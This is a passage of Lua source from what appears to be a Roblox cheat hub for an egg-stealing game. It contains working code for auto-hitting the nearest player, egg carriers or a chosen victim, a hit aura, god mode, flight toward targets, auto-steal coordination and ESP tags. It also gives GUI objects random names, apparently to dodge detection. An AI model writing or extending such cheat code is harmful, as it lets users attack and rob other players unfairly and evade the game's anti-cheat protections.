			if chilliState.Steal.Active or chilliState.Steal.Carrying then
				return false
			end
			local lastFire = combatState.LastFire
			local canSwing = os.clock() - lastFire < 0.3

			if not canSwing then
				canSwing = os.clock() - (combatState.LastSwing or 0) < 0.15
			end

			if canSwing then
				return false
			end
			local character = localPlayer.Character
			local humanoid = combat.Humanoid(character)
			if not character or not humanoid or humanoid.Health <= 0 then
				return false
			end
			local batTool = combat.PickBat(character)
			if not batTool or not equipBat(character, humanoid, batTool) then
				return false
			end
			combatState.LastSwing = os.clock()

			pcall(function()
				batTool:Activate()
			end)

			return true
		end

		combat.HolderOf = function(eggUid)
			local eggModel = workspace:FindFirstChild(eggUid)
			if not eggModel then
				return nil
			end

			for _, descendant in ipairs(eggModel:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, part0, part1 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok then
						for _, part in ipairs({ part0, part1 }) do
							if typeof(part) == "Instance" and not part:IsDescendantOf(eggModel) then
								local model = part:FindFirstAncestorOfClass("Model")
								local playerFromCharacter = model and (Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)) or nil
								if playerFromCharacter and playerFromCharacter ~= localPlayer and playerFromCharacter:IsA("Player") then
									return playerFromCharacter
								end
							end
						end
					end
				end
			end

			return nil
		end

		task.spawn(function()
			while not chilliState.CombatDisposed do
				local holders = {}

				if chilliState.CombatWantsHolders then
					local records = fetchFieldEggs()

					if type(records) == "table" then
						for _, record in pairs(records) do
							if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
								local holderPlayer = combat.HolderOf(record.Uid)

								if holderPlayer then
									holders[holderPlayer] = true
								end
							end
						end
					end
				end

				combatState.Holders = holders
				task.wait(0.3)
			end
		end)

		combat.IsHolder = function(playerObj)
			return combatState.Holders[playerObj] == true
		end

		local onNewLifeCallbacks = {}

		combat.OnNewLife = function(callback)
			table.insert(onNewLifeCallbacks, callback)
		end

		local function resetCombatState()
			table.clear(combatState.Pending)
			combatState.LastFire = 0
			combatState.LastSwing = 0
			combatState.EquipAt = 0
			table.clear(combatState.Tracks)
			table.clear(combatState.WallSide)
			combatState.SpawnRagdoll = getRagdollEndTime(localPlayer)

			for _, callback in ipairs(onNewLifeCallbacks) do
				pcall(callback)
			end
		end

		local characterAdded = localPlayer.CharacterAdded
		local cleanupConnections = { localPlayer.CharacterRemoving:Connect(resetCombatState), characterAdded:Connect(resetCombatState) }

		trackCleanup(function()
			chilliState.CombatDisposed = true

			for _, conn in ipairs(cleanupConnections) do
				pcall(function()
					conn:Disconnect()
				end)
			end
		end)
	end

	do
		local combat = chilliState.Combat
		local TARGET_MODES = { "Nearest", "Egg Holders", "Specific Player" }
		local TARGET_SWITCH_THRESHOLD = 0.7
		local NO_PLAYERS_TEXT = "No other players"

		local combatLoopState = {
			Handles = {},
			AuraHandle = nil,
			Row = nil,
			Picker = nil,
			TargetMode = TARGET_MODES[1],
			Picked = nil,
			LabelToName = {},
			Speed = 400,
			MaxSpeed = 750,
			Target = nil,
			Plan = nil,
			Moving = false,
			Status = "Idle",
			Shown = nil,
			NamesDirty = true,
		}

		local function getActiveTargetMode()
			for i, modeName in ipairs(TARGET_MODES) do
				if chilliState.Toggle(combatLoopState.Handles[i], false) then
					return modeName
				end
			end

			return nil
		end

		local function isAuraEnabled()
			return chilliState.Toggle(combatLoopState.AuraHandle, false) == true
		end

		chilliState.CombatActive = function()
			return getActiveTargetMode() ~= nil or isAuraEnabled()
		end

		local function isPlayerValidTarget(playerObj)
			if not combat.Hittable(playerObj) then
				return false
			end

			if combatLoopState.TargetMode == TARGET_MODES[2] then
				return combat.IsHolder(playerObj)
			end

			if combatLoopState.TargetMode == TARGET_MODES[3] then
				return combatLoopState.Picked ~= nil and playerObj.Name == combatLoopState.Picked
			end
			return true
		end

		local function findBestTarget(selfPos)
			local target = combatLoopState.Target
			local currentMagnitude

			if target and isPlayerValidTarget(target) then
				local _, targetRootPart = combat.Parts(target)
				currentMagnitude = (targetRootPart.Position - selfPos).Magnitude
			else
				currentMagnitude = math.huge
				target = nil
			end

			local closestDist = math.huge
			local closestPlayer = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= target and isPlayerValidTarget(player) and not combat.Ragdolled(player) then
					local _, playerRootPart = combat.Parts(player)
					local dist = (playerRootPart.Position - selfPos).Magnitude

					if dist < closestDist then
						closestDist = dist
						closestPlayer = player
					end
				end
			end

			if target then
				if closestPlayer and not combat.Ragdolled(target) and closestDist < currentMagnitude * TARGET_SWITCH_THRESHOLD then
					return closestPlayer
				end
				return target
			end

			return closestPlayer
		end

		local function findNearestHittableTarget(selfPos, maxDist)
			local closestPlayer = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local character = player.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local dist = (humanoidRootPart.Position - selfPos).Magnitude

						if dist < maxDist and combat.Hittable(player) and not combat.Ragdolled(player) then
							maxDist = dist
							closestPlayer = player
						end
					end
				end
			end

			return closestPlayer, maxDist
		end

		local function stopCombatMovement()
			combatLoopState.Plan = nil

			if combatLoopState.Moving then
				combatLoopState.Moving = false
				chilliState.EndFlight()
				chilliState.GodMode(false)
				chilliState.Shield("combat", false)
				combat.ResetWalls()
			end

			chilliState.ReleaseMovement("combat")
		end

		combat.OnNewLife(function()
			combatLoopState.AuraVictim = nil
			combatLoopState.Target = nil
			combatLoopState.Plan = nil
			pcall(stopCombatMovement)
		end)

		local function isCombatBusy()
			local movement = chilliState.Movement
			return chilliState.Steal.Active or chilliState.Steal.Carrying or chilliState.Steal.Wanted and chilliState.Toggle(autoStealToggle, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
		end

		local function auraTick(selfRootPart)
			local character = localPlayer.Character
			local searchRadius = combat.Range(character and combat.PickBat(character) or nil) + 6
			local closestPlayer, closestDist = findNearestHittableTarget(selfRootPart.Position, searchRadius + 24)

			if not closestPlayer or closestDist > searchRadius then
				combatLoopState.AuraVictim = nil

				if closestPlayer then
					combat.ReadyBat()
				end

				combatLoopState.Status = "Aura ready, nobody in reach"
				return
			end

			combatLoopState.AuraVictim = closestPlayer
			combatLoopState.Status = combat.TryHit(closestPlayer, combat.Plan(closestPlayer, selfRootPart, nil, true)) or "Aura on " .. closestPlayer.DisplayName
		end

		local function combatLoopTick()
			local activeTargetMode = getActiveTargetMode()

			if activeTargetMode and activeTargetMode ~= combatLoopState.TargetMode then
				combatLoopState.TargetMode = activeTargetMode
				combatLoopState.Target = nil
			end

			chilliState.CombatWantsHolders = activeTargetMode == TARGET_MODES[2]
			local isAura = isAuraEnabled()
			local noTargetMode = not activeTargetMode

			if noTargetMode then
				if combatLoopState.Target or combatLoopState.Moving then
					combatLoopState.Target = nil
					stopCombatMovement()
				end
			end

			if noTargetMode and not isAura then
				combatLoopState.Status = "Idle"
				return
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = combat.Humanoid(character)

			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				combatLoopState.Target = nil
				stopCombatMovement()
				combatLoopState.Status = "Waiting for your character"
				return
			end

			if noTargetMode then
				auraTick(humanoidRootPart)
				return
			end
			local bestTarget = findBestTarget(humanoidRootPart.Position)
			combatLoopState.Target = bestTarget

			if not bestTarget then
				stopCombatMovement()
				if isAura then
					auraTick(humanoidRootPart)
					return
				end
				combatLoopState.Status = activeTargetMode == TARGET_MODES[2] and "Waiting for someone to hold an egg" or activeTargetMode == TARGET_MODES[3] and "Picked player is not reachable" or "No player to hit"
				return
			end

			local plan = combat.Plan(bestTarget, humanoidRootPart)
			local skipSelfRagdollCheck = activeTargetMode ~= TARGET_MODES[2]

			if not isCombatBusy() and (skipSelfRagdollCheck or not combat.SelfRagdolled()) and chilliState.ClaimMovement("combat") and not chilliState.AntiGuard.Busy then
				if not combatLoopState.Moving then
					combatLoopState.Moving = true
					chilliState.Shield("combat", true)
					chilliState.GodMode(true)
					chilliState.BeginFlight()
				end

				chilliState.GodTick()
				combatLoopState.Plan = plan
			else
				if combatLoopState.Moving then
					stopCombatMovement()
				end

				combatLoopState.Plan = nil
			end

			local hitResult = combat.TryHit(bestTarget, plan, skipSelfRagdollCheck)
			local distStr = plan and math.floor(plan.Distance + 0.5) or 0

			if hitResult then
				combatLoopState.Status = hitResult .. string.format("  %d studs", distStr)
			elseif isCombatBusy() then
				combatLoopState.Status = string.format("Waiting for Auto Steal, near %s", bestTarget.DisplayName)
			else
				combatLoopState.Status = string.format("Chasing %s  %d studs", bestTarget.DisplayName, distStr)
			end
		end

		local function generatePlayerListOptions()
			local otherPlayers = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(otherPlayers, player)
				end
			end

			table.sort(otherPlayers, function(a, b)
				return string.lower(a.DisplayName) < string.lower(b.DisplayName)
			end)

			local displayNameCounts = {}

			for _, player in ipairs(otherPlayers) do
				displayNameCounts[player.DisplayName] = (displayNameCounts[player.DisplayName] or 0) + 1
			end

			local displayNames = {}
			local labelToNameMap = {}

			for _, player in ipairs(otherPlayers) do
				local displayName = player.DisplayName

				if displayNameCounts[displayName] > 1 then
					displayName = string.format("%s (@%s)", player.DisplayName, player.Name)
				end

				table.insert(displayNames, displayName)
				labelToNameMap[displayName] = player.Name
			end

			if #displayNames == 0 then
				displayNames[1] = NO_PLAYERS_TEXT
			end

			return displayNames, labelToNameMap
		end

		local function getLabelForPlayerName(playerName)
			for label, mappedName in pairs(combatLoopState.LabelToName) do
				if mappedName == playerName then
					return label
				end
			end

			return nil
		end

		local steerConnection = RunService.PreSimulation:Connect(function(deltaTime)
			local plan = combatLoopState.Plan
			if not plan or not combatLoopState.Moving then
				return
			end
			local rootPart = chilliState.Root()

			if rootPart then
				combat.Steer(rootPart, plan, combatLoopState.Speed, math.max(combatLoopState.Speed, combatLoopState.MaxSpeed), deltaTime)
			end
		end)

		local auraInterval = 0.05
		local nextAuraTick = 0

		local combatHeartbeat = RunService.Heartbeat:Connect(function()
			local isAutoTarget = getActiveTargetMode() ~= nil
			local isAura = isAuraEnabled()

			if not isAura then
				combatLoopState.AuraVictim = nil
			end

			local now = os.clock()

			if isAutoTarget or not isAura or now >= nextAuraTick then
				if isAura and not isAutoTarget then
					nextAuraTick = now + auraInterval
				end

				if not pcall(combatLoopTick) then
					combatLoopState.Status = "Retrying"
				end
			end

			if isAutoTarget or isAura and combatLoopState.AuraVictim ~= nil then
				pcall(combat.Swing)
			end

			local statusRow = combatLoopState.Row

			if statusRow and combatLoopState.Shown ~= combatLoopState.Status and type(statusRow.Set) == "function" then
				combatLoopState.Shown = combatLoopState.Status
				pcall(statusRow.Set, statusRow, combatLoopState.Status)
			end

			local targetPicker = combatLoopState.Picker

			if combatLoopState.NamesDirty and targetPicker and type(targetPicker.SetOptions) == "function" then
				combatLoopState.NamesDirty = false
				local displayNames, labelToNameMap = generatePlayerListOptions()
				combatLoopState.LabelToName = labelToNameMap
				pcall(targetPicker.SetOptions, targetPicker, displayNames, combatLoopState.Picked and getLabelForPlayerName(combatLoopState.Picked) or displayNames[1], false)
			end
		end)

		local playerAddedConn = Players.PlayerAdded:Connect(function()
			combatLoopState.NamesDirty = true
		end)

		local playerRemovingConn = Players.PlayerRemoving:Connect(function(player)
			combatLoopState.NamesDirty = true

			if combatLoopState.Target == player then
				combatLoopState.Target = nil
			end
		end)

		trackCleanup(function()
			for _, conn in ipairs({ steerConnection, combatHeartbeat, playerAddedConn, playerRemovingConn }) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			combatLoopState.Target = nil
			stopCombatMovement()
		end)

		local function checkInvisibilityConflict(toggleHandle, title)
			if chilliState.Toggle(toggleHandle, false) and chilliState.Toggle(chilliState.InvisibilityHandle, false) then
				chilliState.UiDefer(function()
					pcall(toggleHandle.Set, toggleHandle, false, false)
					chilliState.Notify(title, "Turn off Invisibility first, both cannot be on at the same time")
				end)

				return true
			end

			return false
		end

		combatLoopState.Row = combatSection:CreateText({ Name = "Hit Status", Text = "Idle" })
		local exclusiveGroup = hubWindow:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })

		for i, toggleName in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
			local toggleHandle = nil

			toggleHandle = combatSection:CreateToggle({
				Name = toggleName,
				Default = false,
				Callback = function()
					checkInvisibilityConflict(toggleHandle, toggleName)
				end,
			})

			pcall(toggleHandle.JoinExclusiveGroup, toggleHandle, exclusiveGroup)
			combatLoopState.Handles[i] = toggleHandle
		end

		local displayNames, labelToNameMap = generatePlayerListOptions()
		combatLoopState.LabelToName = labelToNameMap

		combatLoopState.Picker = combatSection:CreateDropdown({
			Name = "Hit Player",
			Options = displayNames,
			Default = displayNames[1],
			SubOf = combatLoopState.Handles[3],
			Callback = function(arg)
				combatLoopState.Picked = combatLoopState.LabelToName[tostring(arg)]
				combatLoopState.Target = nil
			end,
		})

		combatLoopState.AuraHandle = combatSection:CreateToggle({
			Name = "Hit Aura",
			Default = false,
			Callback = function()
				checkInvisibilityConflict(combatLoopState.AuraHandle, "Hit Aura")
			end,
		})

		pcall(combatLoopState.AuraHandle.JoinExclusiveGroup, combatLoopState.AuraHandle, exclusiveGroup)
		local chaseSettingsLabel = combatSection:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })

		combatSection:CreateSlider({
			Name = "Hit Tween Speed",
			SubOf = chaseSettingsLabel,
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				combatLoopState.Speed = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		combatSection:CreateSlider({
			Name = "Hit Max Speed",
			SubOf = chaseSettingsLabel,
			Min = 100,
			Max = 1000,
			Default = 750,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				combatLoopState.MaxSpeed = math.clamp(tonumber(arg) or 750, 100, 1000)
			end,
		})

		combatSection:CreateSlider({
			Name = "Hit Lead",
			SubOf = chaseSettingsLabel,
			Note = "Stand further ahead of the target (+) or closer to them (-)",
			Min = -400,
			Max = 100,
			Default = -275,
			Increment = 1,
			Callback = function(arg)
				combat.SetLead(arg)
			end,
		})

		combatSection:CreateSlider({
			Name = "Hit Sweep",
			SubOf = chaseSettingsLabel,
			Note = "How far you move back and forth in front of the target",
			Min = 0,
			Max = 250,
			Default = 60,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				combat.SetSweep(arg)
			end,
		})

		local QUICK_BAR_GROUP = 2
		local quickBarBtn = nil

		local function getQuickBarStates()
			local getState = hubWindow.GetState
			return hubWindow:GetState("Quick Pinned Features"), getState(hubWindow, "Quick Pin Groups")
		end

		local function getCombatTogglePaths()
			local paths = {}

			for _, toggleHandle in ipairs({ combatLoopState.Handles[1], combatLoopState.Handles[2], combatLoopState.AuraHandle }) do
				local ok, result = pcall(function()
					return toggleHandle:GetQuickPath()
				end)

				if ok and type(result) == "string" then
					table.insert(paths, result)
				end
			end

			return paths
		end

		local function areCombatTogglesOnQuickBar2()
			local pinnedState, groupsState = getQuickBarStates()
			if not pinnedState or not groupsState then
				return false
			end
			local pinnedPaths = pinnedState:Get()
			local groupMap = groupsState:Get()
			if type(pinnedPaths) ~= "table" or type(groupMap) ~= "table" then
				return false
			end
			local combatPaths = getCombatTogglePaths()
			if #combatPaths == 0 then
				return false
			end

			for _, path in ipairs(combatPaths) do
				if not table.find(pinnedPaths, path) or tonumber(groupMap[path]) ~= QUICK_BAR_GROUP then
					return false
				end
			end

			return true
		end

		local function updateQuickBarBtnText()
			if quickBarBtn and type(quickBarBtn.SetActionText) == "function" then
				pcall(quickBarBtn.SetActionText, quickBarBtn, areCombatTogglesOnQuickBar2() and "Remove" or "Add")
			end
		end

		local function toggleCombatQuickBar()
			local pinnedState, groupsState = getQuickBarStates()
			if not pinnedState or not groupsState then
				chilliState.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
				return
			end
			local isAlreadyOnBar = areCombatTogglesOnQuickBar2()
			local newPinnedPaths = {}
			local newGroupMap = {}
			local oldPinnedPaths = pinnedState:Get()

			if type(oldPinnedPaths) == "table" then
				for i, path in ipairs(oldPinnedPaths) do
					newPinnedPaths[i] = path
				end
			end

			local oldGroupMap = groupsState:Get()

			if type(oldGroupMap) == "table" then
				for k, v in pairs(oldGroupMap) do
					newGroupMap[k] = v
				end
			end

			for _, path in ipairs(getCombatTogglePaths()) do
				local existingIndex = table.find(newPinnedPaths, path)

				if isAlreadyOnBar then
					if existingIndex then
						table.remove(newPinnedPaths, existingIndex)
					end

					newGroupMap[path] = nil
				else
					newGroupMap[path] = QUICK_BAR_GROUP

					if not existingIndex then
						table.insert(newPinnedPaths, path)
					end
				end
			end

			groupsState:Set(newGroupMap)
			pinnedState:Set(newPinnedPaths)
			updateQuickBarBtnText()
			chilliState.Notify("Quick Bar", isAlreadyOnBar and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
		end

		quickBarBtn = combatSection:CreateButton({
			Name = "Add/Remove Hits On Quick Bar 2",
			Note = "Pin or unpin the hit toggles on Quick Bar 2",
			ButtonText = "Add",
			ConfirmText = "Done!",
			Callback = function()
				chilliState.UiDefer(toggleCombatQuickBar)
			end,
		})

		task.delay(3, function()
			chilliState.UiDefer(updateQuickBarBtnText)
		end)
	end

	espSection = chilliState.EspSection

	local function loadFont(fontFamily, weight)
		local ok, result = pcall(Font.new, fontFamily, weight, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	drawingTheme = {
		MainFont = loadFont("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = loadFont("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(keypointsData)
			local keypoints = table.create(#keypointsData)

			for i, data in ipairs(keypointsData) do
				keypoints[i] = ColorSequenceKeypoint.new(data[1], data[2])
			end

			return ColorSequence.new(keypoints)
		end,
	}

	color = Color3.fromRGB
	createColorSequence = drawingTheme.Sequence
	palettes = {}

	do
		local gold = {
			Text = createColorSequence({
				{ 0, color(255, 231, 158) },
				{ 0.4, color(255, 196, 66) },
				{ 1, color(214, 142, 12) },
			}),
			Stroke = createColorSequence({
				{ 0, color(122, 76, 0) },
				{ 0.55, color(62, 38, 0) },
				{ 1, color(20, 12, 0) },
			}),
			Outline = color(255, 232, 152),
		}
		palettes.Gold = gold
	end

	do
		local orange = {
			Text = createColorSequence({
				{ 0, color(255, 198, 132) },
				{ 0.4, color(255, 146, 40) },
				{ 1, color(206, 92, 0) },
			}),
			Stroke = createColorSequence({
				{ 0, color(112, 54, 0) },
				{ 0.55, color(56, 27, 0) },
				{ 1, color(18, 8, 0) },
			}),
			Outline = color(255, 194, 112),
		}
		palettes.Orange = orange
	end

	do
		local red = {
			Text = createColorSequence({
				{ 0, color(255, 105, 105) },
				{ 0.4, color(255, 28, 40) },
				{ 1, color(184, 0, 18) },
			}),
			Stroke = createColorSequence({
				{ 0, color(124, 0, 15) },
				{ 0.55, color(61, 0, 9) },
				{ 1, color(18, 0, 3) },
			}),
			Outline = color(255, 128, 138),
		}
		palettes.Red = red
	end
end

local discordWebhookSection, eggPredictorSection, fusePredictorSection, eggPredictorHelper, predictorSortOptions, predictorStatusCards, paint, bold, predictorColors
local predictorConfig, predictorFocusId, predictorCanvas, predictorLineEntries, predictorLineNodes, predictorViewItems, predictorNeedsTextUpdate, predictorViewIndex, predictorNeedsUpdate, predictorTimeSinceUpdate
local predictorWasVisible, requestEggRefresh, fetchOwnerEggsInfo, updatePredictorCanvas, refreshPredictorLayout

do
	do
		do
			local accent = {
				Text = createColorSequence({
					{ 0, color(170, 255, 160) },
					{ 0.45, color(58, 255, 55) },
					{ 1, color(20, 109, 0) },
				}),
				Stroke = createColorSequence({
					{ 0, color(10, 52, 6) },
					{ 1, color(3, 16, 0) },
				}),
				Outline = color(58, 255, 55),
			}
			palettes.Accent = accent
		end

		do
			local sheen = {
				Text = createColorSequence({
					{ 0, color(255, 255, 255) },
					{ 0.5, color(222, 222, 222) },
					{ 1, color(255, 255, 255) },
				}),
				Stroke = createColorSequence({
					{ 0, color(8, 8, 8) },
					{ 1, color(8, 8, 8) },
				}),
				Outline = color(255, 255, 255),
			}
			palettes.Sheen = sheen
		end

		drawingTheme.Palettes = palettes

		drawingTheme.PaletteFromColor = function(baseColor)
			local white = Color3.new(1, 1, 1)
			local black = Color3.new(0, 0, 0)
			local newPalette = {}
			local textSequence = {}
			textSequence[1] = { 0, baseColor:Lerp(white, 0.5) }
			textSequence[2] = { 0.4, baseColor:Lerp(white, 0.1) }
			textSequence[3] = { 1, baseColor:Lerp(black, 0.25) }
			newPalette.Text = drawingTheme.Sequence(textSequence)
			local strokeSequence = {}
			strokeSequence[1] = { 0, baseColor:Lerp(black, 0.55) }
			strokeSequence[2] = { 0.55, baseColor:Lerp(black, 0.75) }
			strokeSequence[3] = { 1, baseColor:Lerp(black, 0.92) }
			newPalette.Stroke = drawingTheme.Sequence(strokeSequence)
			newPalette.Outline = baseColor:Lerp(white, 0.25)
			return newPalette
		end

		drawingTheme.SizeScale = 1
		local onSizeChangedCallbacks = {}

		drawingTheme.OnSizeChanged = function(callback)
			table.insert(onSizeChangedCallbacks, callback)
		end

		drawingTheme.SetSizeScale = function(sizeScale)
			if drawingTheme.SizeScale == sizeScale then
				return
			end
			drawingTheme.SizeScale = sizeScale

			for _, callback in ipairs(onSizeChangedCallbacks) do
				pcall(callback)
			end
		end

		drawingTheme.RowHeight = function(scaleFactor)
			local currentCamera = workspace.CurrentCamera
			return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (scaleFactor or drawingTheme.SizeScale)))
		end

		drawingTheme.ScaledWidth = function(width, scaleFactor)
			return math.max(30, math.floor(width * (scaleFactor or drawingTheme.SizeScale)))
		end

		drawingTheme.CreateRuntime = function()
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = generateRandomKey()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.DisplayOrder = 48
			screenGui.Parent = uiParent
			return screenGui
		end

		drawingTheme.CreateTag = function(parent, maxDistance)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = generateRandomKey()
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = maxDistance
			local frame = Instance.new("Frame")
			frame.Name = generateRandomKey()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.Name = generateRandomKey()
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			billboardGui.Parent = parent
			return billboardGui, frame
		end

		drawingTheme.CreateTextRow = function(parent, fontFace, layoutOrder, scale)
			local frame = Instance.new("Frame")
			frame.Name = generateRandomKey()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, scale)
			frame.LayoutOrder = layoutOrder
			frame.Parent = parent

			local function createTextLabel(zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = generateRandomKey()
				textLabel.BackgroundTransparency = 1
				textLabel.Size = UDim2.fromScale(1, 1)
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex

				if fontFace then
					textLabel.FontFace = fontFace
				else
					textLabel.Font = Enum.Font.GothamBold
				end

				textLabel.Parent = frame
				return textLabel
			end

			local shadowLabel = createTextLabel(2)
			shadowLabel.Position = UDim2.fromOffset(1, 1)
			shadowLabel.TextColor3 = Color3.new(0, 0, 0)
			shadowLabel.TextTransparency = 0.1
			local mainLabel = createTextLabel(3)
			mainLabel.TextColor3 = Color3.new(1, 1, 1)
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = generateRandomKey()
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Color = Color3.new(1, 1, 1)
			uiStroke.Transparency = 0.05

			uiStroke.Thickness = pcall(function()
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.2

			uiStroke.Parent = mainLabel
			local strokeGradient = Instance.new("UIGradient")
			strokeGradient.Name = generateRandomKey()
			strokeGradient.Rotation = 90
			strokeGradient.Parent = uiStroke
			local textGradient = Instance.new("UIGradient")
			textGradient.Name = generateRandomKey()
			textGradient.Rotation = 90
			textGradient.Parent = mainLabel
			return { Holder = frame, Shadow = shadowLabel, Label = mainLabel, StrokeGradient = strokeGradient, TextGradient = textGradient, Palette = nil }
		end

		drawingTheme.SetRow = function(rowObj, text, palette)
			if rowObj.Label.Text ~= text then
				rowObj.Label.Text = text
				rowObj.Shadow.Text = text
			end

			if rowObj.Palette ~= palette then
				rowObj.Palette = palette
				rowObj.TextGradient.Color = palette.Text
				rowObj.TextGradient.Rotation = palette.Rotation or 90
				rowObj.StrokeGradient.Color = palette.Stroke
			end
		end

		drawingTheme.ReadToggle = function(toggleObj, defaultVal)
			if type(toggleObj) ~= "table" then
				return defaultVal == true
			end

			local ok, result = pcall(function()
				local controller = toggleObj._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, methodName in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return toggleObj[methodName]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, toggleObj)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return defaultVal == true
		end

		drawingTheme.SyncSoon = function(callback)
			callback()
			task.delay(0.35, callback)
		end

		drawingTheme.GetGuardAreas = function()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			return world and world:FindFirstChild("GuardAreas")
		end

		drawingTheme.FindGuardRoot = function(guardModel)
			local humanoidRootPart = guardModel:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
				return humanoidRootPart
			end

			if guardModel.PrimaryPart then
				return guardModel.PrimaryPart
			end
			return guardModel:FindFirstChildWhichIsA("BasePart", true)
		end

		drawingTheme.WatchGuards = function(callback)
			local connections = {}
			local guardAreas = drawingTheme.GetGuardAreas()
			if not guardAreas then
				return connections
			end

			local function processArea(areaFolder)
				local guard = areaFolder:FindFirstChild("Guard")

				if guard and guard:IsA("Model") then
					callback(areaFolder.Name, guard)
				end

				table.insert(connections, areaFolder.ChildAdded:Connect(function(child)
					if child.Name == "Guard" and child:IsA("Model") then
						callback(areaFolder.Name, child)
					end
				end))
			end

			for _, areaFolder in ipairs(guardAreas:GetChildren()) do
				processArea(areaFolder)
			end

			table.insert(connections, guardAreas.ChildAdded:Connect(processArea))
			return connections
		end

		drawingTheme.DisconnectAll = function(connectionsList)
			for _, conn in ipairs(connectionsList) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			table.clear(connectionsList)
		end

		local EGG_PROPERTIES_COUNT = 18

		local EGG_COLUMNS = {
			"Icon",
			"Name",
			"Rarity",
			"Mutation",
			"Value",
			"Weight",
			"Size",
			"Sell Price",
			"Distance",
			"Area",
			"State",
		}

		local DEFAULT_EGG_INFO = { "Icon", "Name", "Value" }
		local HIGHLIGHT_MODES = { "Off", "Rare Only", "All Shown" }
		local EGG_INFO_SCALES = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }

		local function getPredictorFont()
			local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
			return ok and result or drawingTheme.StatusFont
		end

		local predictorFont = getPredictorFont()
		local predictorGradient

		do
			local colorSeq = drawingTheme.Sequence
			local points = {}
			points[1] = { 0, Color3.fromRGB(255, 255, 255) }
			points[2] = { 0.2, Color3.fromRGB(206, 212, 224) }
			points[3] = { 0.42, Color3.fromRGB(74, 80, 94) }
			points[4] = { 0.58, Color3.fromRGB(42, 46, 56) }
			points[5] = { 0.78, Color3.fromRGB(158, 166, 182) }
			points[6] = { 1, Color3.fromRGB(250, 252, 255) }
			secretGradient = colorSeq(points)
			predictorGradient = secretGradient
		end

		local predictorPalette = drawingTheme.PaletteFromColor(Color3.fromRGB(77, 255, 122))
		local mutationPalette = {}

		do
			local colorSeq = drawingTheme.Sequence
			local points = {}
			points[1] = { 0, Color3.fromRGB(255, 255, 255) }
			points[2] = { 0.5, Color3.fromRGB(222, 238, 255) }
			points[3] = { 1, Color3.fromRGB(255, 255, 255) }
			mutationPalette.Text = colorSeq(points)
		end

		do
			local colorSeq = drawingTheme.Sequence
			local points = {}
			points[1] = { 0, Color3.fromRGB(8, 8, 8) }
			points[2] = { 1, Color3.fromRGB(8, 8, 8) }
			mutationPalette.Stroke = colorSeq(points)
		end

